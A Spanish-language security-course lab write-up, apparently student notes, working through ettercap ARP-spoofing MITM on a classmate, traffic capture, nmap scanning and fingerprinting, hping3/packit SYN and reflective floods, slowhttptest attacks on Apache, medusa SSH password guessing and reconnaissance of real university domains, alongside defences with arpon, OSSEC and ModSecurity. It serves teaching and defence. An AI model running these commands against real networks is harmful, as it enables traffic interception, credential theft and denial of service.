# Práctica 2: Categorías de ataques


***a) Instale el ettercap y pruebe sus opciones básicas en línea de comando***

```
sudo apt-get install ettercap-text-only
```

Options:

- **T/G/C:** Ejecuta ettercap en modo texto/GTK/Ncurses.
- **Tq:** No muestre los mensajes
- **q:** Modo silencioso, no muestra el contenido de los paquetes excepto el de los que
contienen las contraseñas
- **M:** <método:[opción, ...]> Realiza un ataque man in the middle usando el método
especificado por ‘método’ y con las opciones especificadas por ‘opcion’
- **arp:** Nos permite redirigir el tráfico usando arp-spoofing:remote tráfico del exterior
- **port:** Permite realizar port-stealing sobre un switch Ethernet
- **otros:** icmp, dhcp, ndp
- **i:** <interfaz> Permite especificar la interfaz de red
- **p:** No activa la tarjeta en modo promiscuo
- **u:** Sitúa el ettercap en modo no ofensivo. En este modo ettercap no redirige los paquetes
que analiza, lo que permite ejecutar múltiples instancias sobre una máquina sin duplicar
paquetes
- **P <plugin>** Carga un plugin de ettercap.
- **P list** Muestra una lista de los plugins disponibles
- **L <logfile>** Guarda en formato binario todos los paquetes, así como información sobre
contraseñas y host en el fichero especificado por ‘logfile’
- **w:** para guardar el pcapfile

***b) Capture paquetería variada de su compañero de prácticas que incluya varias sesiones HTTP. Sobre esta paquetería (puede utilizar el wireshark para los siguientes subapartados)***

1. Hacemos un MITM a la máquina de nuestro compañero:

```
ettercap -T -q -i ens33 -M arp:remote //Ip Alex/ //10.11.48.1/
```

2. En otra terminal, hacemos un tcpdump para guardar el tráfico capturado en un fichero `compa.pcap`:

```
tcpdump -i ens33 -s 65535 -w compa.pcap

```

3. Desde nuestra máquina local, hacemos un `scp` para obtener el fichero `compa.pcap`:

```
scp lsi@10.11.48.50:/home/lsi/compa.pcap .
```

4. Ejecutamos Wireshark y abrimos el archivo compa.pcap para comenzar a analizar.





- **Identifique los campos de cabecera de un paquete TCP:**

(doble click en paquete)

- **Filtre la captura para obtener el tráfico HTTP**
  
Donde pone buscar por filtro

- **Obtenga los distintos “objetos” del tráfico HTTP (imágenes, pdfs, etc.)**
  
archivo -> exportar objetos -> http

- **Visualice la paquetería TCP de una determinada sesión.**
  
Poner en la barra de filtros tcp y darle a la flecha.

- **Sobre el total de la paquetería obtenga estadísticas del tráfico por protocolo como fuente de información para un análisis básico del tráfico.**

Statistics -> Protocol Hierarchy

- **Obtenga información del tráfico de las distintas “conversaciones” mantenidas.**

Statistics -> Conversations

- **Obtenga direcciones finales del tráfico de los distintos protocolos como mecanismo para determinar qué circula por nuestras redes.**

Statistics -> Endpoints 



***c) Obtenga la relación de las direcciones MAC de los equipos de su segmento.***

Se puede hacer con nMap o con Nast.
```
sudo apt-get install nast
```
```
sudo apt-get install nmap
```
- Con Nmap:
```
nmap -sP 10.11.48.0/23
```
- Con nast:
```
nast -m -i ens33
```
***d) Obtenga la relación de las direcciones IPv6 de su segmento***

- Con ping6:

Envía paquetes icmpv6 a todos los nodos del enlace local (dir multicast ff02::1). Con -c 2 hacemos que se envíen sólo dos paquetesECHO_REQUEST a cada nodo. -I interfaz.
```
ping6 -c2 -I ens33 ff02::1
```
Muestra la Neighbor Table de ipv6 (en ipv6 no existe ARP, existe Neighbor Discovery Protocol (NDP), equivalente a ARP). Ejecutar esto después de hacer el ping6.
```
ip -6 neigh
```
- Con thc-ipv6
```
apt-get install thc-ipv6
```
Mostrar direcciones vivas en segmento:
```
atk6-alive6 ens33
```

***e) Obtenga el tráfico de entrada y salida legítimo de su interface de red ens33 e investigue los servicios, conexiones y protocolos involucrados.***

```
sudo apt-get install tcpdump
```

```
tcpdump -w apartado_e -i ens33
```


***f) Mediante arpspoofing entre una máquina objetivo (víctima) y el router del laboratorio obtenga todas las URL HTTP visitadas por la víctima.***

```
ettercap -Tq -M arp:remote -P remote_browser /IP Alex// /10.11.48.1// -w /home/lsi/Descargas/apartado_f
```

- Desde el wireshark:

Statistics > HTTP > Requests:

***g) Instale metasploit. Haga un ejecutable que incluya un Reverse TCP meterpreter payload para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en ingeniería social para que una víctima u objetivo lo ejecute.***


***h) Haga un MITM en IPv6 y visualice la paquetería.***

Mi IPv6 es () -> 10.11.48.207
La de mi compañero es () -> 10.11.48.203

**- ATACANTE:**

Creamos antes el archivo en /var/log/MITMIPv6

```
ettercap -i ens33 -P repoison_arp -T -M arp:remote /Ip_Alex/Ipv6_Alex/ /10.11.48.1// -w /var/log/MITMIPv6
```
**- VICTIMA:**

En la víctima únicamente hacemos 

```
ping6 -c2 -I ens33 ff02::1
```
El archivo generado lo abrimos en wireshark 

-> wireshark > Archivo > Abrir >
/var/log/MITMIPv6

En el archivo hay que localizar la MAC de la víctima.

***i) Pruebe alguna herramienta y técnica de detección del sniffing (preferiblemente arpon).***
 
 Para instlar arpon:
 
 ```
sudo apt-get install arpon
```
Para configurar arpon, abrimos el archivo de configuración y añadimos las IP y mac propia, la del compañero y la de router.

```
pico /etc/arpon.conf
```
Para obtener las MACs:

```
arp -a
```
Para probarlo, mientras uno realiza un ataque, el otro:

Activamos arpon en ens33:

```
systemctl start arpon@ens33
```
Paramos arpon en ens33
```
systemctl stop arpon@ens33
```
Para ver las tablas arp:

```
arp -a
```
Comprobamos si el arpon esta desactivado, si lo esta tiene que aparecer la MAC del compañero en lugar de la Mac del router:

```
arp -a | grep 10.11.48.1
```

Para limpiar Arp

```
ip -s -s neigh flush all
```
Vemos las ultimas líneas del registro de arpon, para comprobar que funciona, quien ha hecho el ataque debe haer un arp-a y ver que la Mac de la víctima no ha cambiado.

```
tail /var/log/arpon/arpon.log
```

***j) Pruebe distintas técnicas de host discovey, port scanning y OS fingerprinting sobre las máquinas del laboratorio de prácticas en IPv4. Realice alguna de las pruebas de port scanning sobre IPv6. ¿Coinciden los servicios prestados por un sistema con los de IPv4?.***

- **IPv4:**

Host discovery:

```
nmap -sL 10.11.48.0/24
```
Port scanning:

```
nmap -sS 10.11.48.0/24
```
OS fingerprinting

```
nmap -O 10.11.48.203
```

- **IPv6:**

Host discovery:

```
nmap -6 -sL 2002:a0b:30cf::1

```


***k) Obtenga información “en tiempo real” sobre las conexiones de su máquina, así como del ancho de banda consumido en cada una de ellas.***

Iftop: Escucha las conexiones en una determinada interfaz y muestra el ancho de banda utilizado por dichas conexiones

```
iftop -i ens33
```
- Primera columna: ip origen
- Segunda columna: direccion de tráfico =>(subida) <=(bajada)
- Tercera columna: ip destino
- Últimas tres columnas: ancho de banda en los últimos 2, 10 y 40 segundos


Para ver ancho de banda en tiempo real:
```
vnstat -l -i ens33
```
Si queremos mostrarlo por horas_

```
vnstat -h
```

***l) Monitorizamos nuestra infraestructura.:***

***• Instale prometheus y node_exporter y configúrelos para recopilar todo tipo de métricas de su máquina linux.***

***• Posteriormente instale grafana y agregue como fuente de datos las métricas de su equipo de prometheus.***

***• Importe vía grafana el dashboard 1860.***

***• En los ataques de los apartados m y n busque posibles alteraciones en las métricas visualizadas.***


***m) PARA PLANTEAR DE FORMA TEÓRICA.: ¿Cómo podría hacer un DoS de tipo direct attack contra un equipo de la red de prácticas? ¿Y mediante un DoS de tipo reflective flooding attack?.***

**Direct attack:** Envío masivo de paquetes de manera directa a la víctima (la dirección origen es normalmente falsificada). Ejemplos: Ping of Dead, TCP SYN Flood….

**Reflective flooding attack:** Se utilizan nodos intermedios como amplificadores (routers,servidores web, DNS …). El atacante envía paquetes que requieren respuesta a losamplificadores con ip origen la ip de la víctima ( los amplificadores responderánmasivamente a la víctima). Ejemplos: SMURF, FRAGGLE…

**Herramientas:**
- Packit: Inyecta, manipula y monitoriza tráfico ip.
- Hping3: Añade funcionalidades a ping (spoofing, inyección de paquetes …)

- 
Direct attack: Inyectar muchos paquetes tcp por el puerto 22 (ssh) con el flag SYN activado,desde una ip aleatoria a la víctima.

```
packit -c 0 -b 0 -s 10.10.102.Y -d 10.10.102.X -F S -S 1000 -D 22
```

**-c :** num total de paquetes a enviar (0 indica todos los que pueda).

**-b :** num de paquetes a inyectar cada intervalo de tiempo (especificado por -w y por defecto

```
hping3 --rand-source -p 80 -S --flood 10.10.102.X
```

**--rand-source:** direcciones ip aleatorias.

**-S :** flag SYN activo.

**--flood :** envía paquetes todo lo rápido que pueda.


**Reflective flooding attack:** Inyectar paquetes ICMP-Echo Request con ip destino todas las redes de la LAN e ip origen la víctima. Todas las máquinas enviarán ICMP-Reply a la víctima.

```
packit -sR -d 10.10.102.233 -c 0 -b 0 -F S -S 80 -D 22
```
**-sR :** ip random.

```
hping3 --icmp 10.10.102.X --rand-dest --flood 10.10.102.X
```

**10.10.102.X --rand-dest : X será un número aleatorio 0 - 255.**



***n) Ataque un servidor apache instalado en algunas de las máquinas del laboratorio de prácticas para tratar de provocarle una DoS. Utilice herramientas DoS que trabajen a nivel de aplicación (capa 7). ¿Cómo podría proteger dicho servicio ante este tipo de ataque? ¿Y si se produjese desde fuera de su segmento de red? ¿Cómo podría tratar de saltarse dicha protección?***

-H' Starts slowhttptest in SlowLoris mode, sending unfinished HTTP requests.

-B' Starts slowhttptest in Slow POST mode, sending unfinished HTTP message bodies.

-X' Starts slowhttptest in Slow Read mode, reading HTTP responses slowly.

**SLOWHTTPTEST:**

 - c: número de conexiones.
 - B: modo Slow POST.
- X: modo Slow Read.
- i: intervalo entre up data for slowrois and Slow POST tests.
- s: Valor de Content-Length header para el Slow POST test.
- x: tamaño máximo de up data en Slow POST.
- t: Specifies the verb to use in an HTTP request.
- g: fuerza a generar CSV y HTML
- o: Especifica nombre -g.
- r: conexiones por segundo.
- w: rango de bytes del advertised windows size start Slow Read.
- y: rango de bytes del advertised windows size end Slow Read.
- n: intervalo entre operaciones de lectura Slow Read.
- z: número de bytes a recibir en la operación read() Slow Read.
- k: número de veces que el recurso es solicitado por socket en Slow Read.
- u: URL.
- p: tiempo que espera por respuesta HTTP.

 
Herramienta que simula algunos ataques de denegación de servicio en la capa daplicación

**Slow Headers :** Enviar cabeceras incompletas. Queda abierta la conexión.

```
slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -t GET -u http://10.11.48.141/index.html -x 24 -p 3
```

**Slow Post:** Post con "Content-Length" menor a la cantidad que se envía. Queda abierta conexión esperando.

```
slowhttptest -c 3000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://10.11.48.141/index.html -x 10 -p 3
```

**Slow Read :** Peticiones legítimas pero se ralentiza el proceso de lectura de las respuestas.

```
slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://10.11.48.141/index.html -p 3
```


***o) Instale y configure modsecurity. Vuelva a proceder con el ataque del apartado anterior. ¿Qué acontece ahora?***

https://www.linode.com/docs/guides/securing-apache2-with-modsecurity/ -> seguir enlace,desactivar ossec, sino banean IPs

**deshabilita el módulo**

```
a2dismod security2
```
**habilita el módulo**

```
a2enmod security2
```

curl http://10.11.48.27/ -> victima/atacante

**ATAQUE DE SLOW HEADERS:** 

```
slowhttptest -c 1000 -H -g -i 10 -r 200 -t GET -u http://10.11.48.x -x 24 -p 3
```

**ATAQUE DE SLOWBODY:**

```
slowhttptest -c 1000 -B -g -i 110 -r 200 -s 8192 -t FAKEVERB -u http://10.11.48.x -x 10 -p 3
```

**ATAQUE DE SLOWREAD:**

```
slowhttptest -c 1000 -g -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://10.11.48.x -p 3
```


perl /usr/share/doc/libapache2-mod-evasive/examples/test.pl
tail -f /var/log/apache2/error.log -> comprueba los accesos a la máquina


***p) Buscamos información.:***

***• Obtenga de forma pasiva el direccionamiento público IPv4 e IPv6 asignado a la Universidade da Coruña.***

```
host udc.es

```

**Info**

Rango de direccionamineto IPv4 de la UDC:

https://apps.db.ripe.net/db-web-ui/query?searchtext=193.144.53.84

Mas info de la UDC: 

https://ip6.nl/#!udc.es

Info del dominio de udc.es (tenemos que buscarlo)

https://www.nic.es/sgnd/dominio/publicBuscarDominios.action

Resolución inversa:

```

host 8.8.8.8

```

***• Obtenga información sobre el direccionamiento de los servidores DNS y MX de la Universidade da Coruña.***

Primero instalamos:

```
apt-get install dnsutils
```

MX:
```
nslookup -query=mx udc.es
```
DNS:
```
nslookup -type=NS udc.es
```

***• ¿Puede hacer una transferencia de zona sobre los servidores DNS de la UDC?. En caso negativo, obtenga todos los nombres.dominio posibles de la UDC.***

No podemos hacerlo, No se puede realizar una transferencia de zona sobre los servidores DNS porque están configurados para eso.

```
dig @10.11.48.27 axfr udc.es
```

Como no podemos hacerla, para obtener dotos los nombres.dominio de la UDC:

```
dnsrecon -d udc.es
```

***• ¿Qué gestor de contenidos se utiliza en www.usc.es?***

Un CMS crea, administra y actualiza una página web

Instalamos:

```
apt install whatweb
```

Para ver el gestor de contenidos:

```
whatweb www.usc.es
```


nslookup 8.8.8.8



***q) Trate de sacar un perfil de los principales sistemas que conviven en su red de prácticas, puertos accesibles, fingerprinting, etc.***

Perfil de los sistemas de nuestra red:

host discovery:

```
nmap -sL 10.11.48.0/24
```
port scanning 

```
nmap -sS 10.11.48.0/24
```

OS fingerprinting
```
nmap -O 10.11.48.27
```

***r) Realice algún ataque de “password guessing” contra su servidor ssh y compruebe que el analizador de logs reporta las correspondientes alarmas.***

Realizamos ataque con medusa le añadi la passwd correcta en la posicion10 del txt:

```
medusa -h 10.11.48.207 -u lsi -P 10k-most-common.txt -M ssh

```

Sin "proteccion" vemos que logra conectarse.



***s) Reportar alarmas está muy bien, pero no estaría mejor un sistema activo, en lugar de uno pasivo. Configure algún sistema activo, por ejemplo OSSEC, y pruebe su funcionamiento ante un “password guessing”.***

Reportar alarmas está muy bien, pero no estaría mejor un sistema activo, en lugar de uno pasivo. Configure algún sistema activo, por ejemplo OSSEC, y pruebe su funcionamiento ante un “password guessing”.

Instalar [OSSEC](https://www.ossec.net/docs/docs/manual/installation/installation-requirements.html):


```

apt -y install  wget git vim unzip make gcc build-essential php php-cli php-common libapache2-mod-php apache2-utils inotify-tools libpcre2-dev zlib1g-dev  libz-dev libssl-dev libevent-dev build-essential libsystemd-dev

```

```

wget https://github.com/ossec/ossec-hids/archive/refs/tags/3.7.0.zip

```

```

mv 3.7.0.zip  ossec-hids-3.7.0.zip

```

```

unzip ossec-hids-3.7.0.zip

```

```

cd ossec-hids-3.7.0

```

```

./install.sh

```


Iniciamos el OSSEC:


```
/var/ossec/bin/ossec-control start

```

Instalamos medusa en el equipo para realizar el ataque password guessing:

```
sudo apt-get install medusa
```

Iniciamos ataque de password guessing desde la máquina del compañero:

```
medusa -h 10.11.48.207 -u lsi -P 10k-most-common.txt -M ssh

```

Vemos que tras los primeros intentos, ya no permite más, ni tampoco conectar por ssh, así que lo desbaneamos:

```

/var/ossec/active-response/bin/host-deny.sh delete - 10.11.48.203

```

```

/var/ossec/active-response/bin/firewall-drop.sh delete - 10.11.48.203

```
Para comprobar los logs:

```

tail /var/ossec/logs/ossec.log

```

```
tail /var/ossec/logs/active-responses.log
```




***t) Supongamos que una máquina ha sido comprometida y disponemos de un fichero con sus mensajes de log. Procese dicho fichero con OSSEC para tratar de localizar evidencias de lo acontecido (“post mortem”). Muestre las alertas detectadas con su grado de criticidad, así como un resumen de las mismas.***


[ossec-logtest](https://www.ossec.net/docs/docs/programs/ossec-logtest.html#example-2-using-ossec-for-the-forensic-analysis-of-log-files)

```

cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a

```

Para sacar un report con un resumen:

```

cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a |/var/ossec/bin/ossec-reportd

```



****APACHE****

*Nota: Para poder probarlo hay que desactivar el OSSEC porque sino baneará la IP que esta atacando*

```
/var/ossec/bin/ossec-control stop
```

1. Instalaremos Apache:

```
sudo apt update && sudo apt upgrade
```
```
sudo apt-get install apache2
```

2. Comprobamos si esta instalado correctamente:

```
systemctl status apache2
```

3. Instalamos el modSecurity:

```
apt install libapache2-mod-security2
```

4. Aqui podemos ver  el archivo de configuración de modSecurity:
```
pico /etc/apache2/mods-enabled/security2.conf
```

5. Renombramos el archivo modsecurity.conf.recommended:
```
sudo mv /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf
```

6. Modificamos la configuracion que se aplicará en modSecurity cambiando lo siguiente:

```
pico /etc/modsecurity/modsecurity.conf
```

Cambiamos SecRuleEngine DetectionOnly por SecRuleEngine On para que bloquee y no solo deje log sin bloquear
Cambiamos SecAuditLogParts ABDEFHIJZ por SecAuditLogParts ABCEFHJKZ
Y añadimos lo siguiente para limitar las conexiones a 50 y protegernos de ataque SlowLoris y SlowHttpTest

SecConnEngine On
SecConnReadStateLimit 50
SecConnWriteStateLimit 50

7. Ahora vamos a descargamos tambien el conjunto de reglas  básicas (CRS) de OWASP:

Primero creamos el directorio principal para OWASP:
```
sudo mkdir /etc/apache2/modsec/
```
Nos colocamos en este directorio y descargamos dichas reglas:
```
wget https://github.com/coreruleset/coreruleset/archive/refs/tags/v3.3.4.zip
```
Descomprimimos el archivo:
```
unzip v3.3.4.zip
```
Renombramos el archivo de configuracion de dichas reglas y dejamos el otro como una copia de seguridad:
```
sudo cp /etc/apache2/modsec/coreruleset-3.3.4/crs-setup.conf.example /etc/apache2/modsec/coreruleset-3.3.4/crs-setup.conf
```

8. Ahora activaremos estas reglas bascias de OWASP que hemos descargado:

Para ello tenemos que ir al archivo de configuracion de mosecurity
```
/etc/apache2/mods-enabled/security2.conf
```

y añadir las siguientes lineas:

Include /etc/apache2/modsec/coreruleset-3.3.4/crs-setup.conf
Include /etc/apache2/modsec/coreruleset-3.3.4/rules/*.conf

y comentaremos la siguiente:

# IncludeOptional /usr/share/modsecurity-crs/*.load

De esta forma el ModSecurity utilizará las reglas que le hemos dicho en el archivo de configuración que seran las reglas de OWASP que hemos añadido y la configuración que hemos configurado en el archivo /etc/modseccurity/modsecurity.conf

9. Despues de finalizar nuestra configuración reniciaremos apache para que los cambios sean efectivos:
```
systemctl restart apache2
```






**METASPOLOIT**

https://www.linuxcapable.com/how-to-install-metasploit-framework-on-debian-linux/

https://orcacore.com/install-metasploit-debian-12-bookworm/

https://medium.com/@marin.novak1988/what-is-metasploit-and-how-to-install-it-on-debian-2d592f6f618e


**PROMETHEUS**

https://feriman.com/install-and-configure-prometheus-on-debian-10-11/

**GRAFANA**

https://www.server-world.info/en/note?os=Debian_12&p=grafana












